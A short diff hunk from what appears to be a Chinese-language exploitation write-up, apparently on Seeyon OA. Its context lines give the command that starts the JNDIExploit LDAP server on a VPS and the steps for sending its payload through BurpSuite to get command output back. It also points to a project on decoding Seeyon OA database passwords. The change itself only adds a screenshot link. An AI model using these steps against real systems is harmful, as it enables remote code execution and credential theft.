@@ -24,6 +24,8 @@ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 0.0.0.0 -l 1389 -p 1289
 
 先在vps运行以上JNDI反序列化漏洞利用工具，然后复制脚本提供的Payload，替换ldap链接到BurpSuite中发包测试发包，可回显。
 
+![202108092129583](https://oss.zjun.info/zjun.info/202108092129583.png)
+
 最后推荐一个关于致远OA数据库密码解码及相关笔记的项目：
 
 https://github.com/jas502n/OA-Seeyou
